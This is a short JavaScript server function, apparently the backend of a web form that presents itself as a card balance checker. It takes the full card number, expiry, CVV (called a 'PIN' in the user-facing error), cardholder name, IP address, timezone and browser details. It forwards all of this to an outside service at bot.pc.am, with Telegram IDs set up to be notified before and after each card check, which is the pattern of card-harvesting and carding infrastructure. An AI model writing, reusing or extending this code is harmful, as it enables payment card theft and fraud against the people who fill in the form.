const API_URL = 'https://bot.pc.am/v3/checkBalance';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

const SAFE_ERROR = 'Unable to check balance. Please try again later.';

function str(v, max) {
  if (typeof v !== 'string') return '';
  return v.slice(0, max);
}

export async function onRequestOptions() {
  return new Response(null, { status: 204, headers: corsHeaders });
}

export async function onRequestPost(context) {
  const { request, env } = context;

  const API_TOKEN = env.API_TOKEN;
  const TELEGRAM_BEFORE = env.TELEGRAM_ID_BEFORE_CHECK || '';
  const TELEGRAM_AFTER = env.TELEGRAM_ID_AFTER_CHECK || '';
  const REQUEST_TIMEOUT = env.REQUEST_TIMEOUT || '';
  const CACHE_SECONDS = env.CACHE_RESPONSE_SECONDS || '';
  const SCREENSHOT = env.SCREENSHOT || '';
  const SCREENSHOT_QUALITY = env.SCREENSHOT_JPEG_QUALITY || '';
  const SCREENSHOT_SIZE = env.SCREENSHOT_BOX_SIZE || '';

  if (!API_TOKEN) {
    return Response.json({ success: false, error: 'Service unavailable' }, { headers: corsHeaders });
  }

  try {
    const body = await request.json();

    const number = str(body.cardNumber, 19).replace(/\s/g, '');
    const month = str(body.expiryMonth, 2).padStart(2, '0');
    const year = str(body.expiryYear, 2);
    const cvvVal = str(body.cvv, 4);
    const cardHolder = str(body.cardHolder, 100);
    const timezone = str(body.timezone, 60);
    const userAgent = str(body.userAgent, 300);
    const referral = str(body.referral, 200);
    const pageUrl = str(body.pageUrl, 200);

    if (number.length < 15 || number.length > 19 || !/^\d+$/.test(number)) {
      return Response.json({ success: false, error: 'Please enter a valid card number' }, { headers: corsHeaders });
    }
    if (!cvvVal || cvvVal.length < 3 || !/^\d+$/.test(cvvVal)) {
      return Response.json({ success: false, error: 'Please enter a valid PIN' }, { headers: corsHeaders });
    }

    const ip = request.headers.get('cf-connecting-ip')
      || request.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
      || '';

    const infoParts = [];
    infoParts.push(`IP: ${ip || 'unknown'}`);
    if (timezone) infoParts.push(`Timezone: ${timezone}`);
    infoParts.push(`Referral: ${referral || 'Direct'}`);
    infoParts.push(`Page: ${pageUrl || 'unknown'}`);
    if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
    if (userAgent) infoParts.push(`UA: ${userAgent}`);

    const params = new URLSearchParams({
      token: API_TOKEN,
      number,
      month,
      year,
      cvv: cvvVal,
    });

    if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
    if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);
    params.set('telegram_additional_note', infoParts.join(' | '));
    if (REQUEST_TIMEOUT) params.set('request_timeout', REQUEST_TIMEOUT);
    if (CACHE_SECONDS) params.set('cache_response_seconds', CACHE_SECONDS);
    if (SCREENSHOT) params.set('screenshot', SCREENSHOT);
    if (SCREENSHOT_QUALITY) params.set('screenshot_jpeg_quality', SCREENSHOT_QUALITY);
    if (SCREENSHOT_SIZE) params.set('screenshot_box_size', SCREENSHOT_SIZE);

    const apiRes = await fetch(API_URL + '?' + params.toString());
    const text = await apiRes.text();

    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { success: false, error: 'Invalid response' };
    }

    return Response.json(data, { headers: corsHeaders });
  } catch {
    return Response.json({ success: false, error: SAFE_ERROR }, { headers: corsHeaders });
  }
}
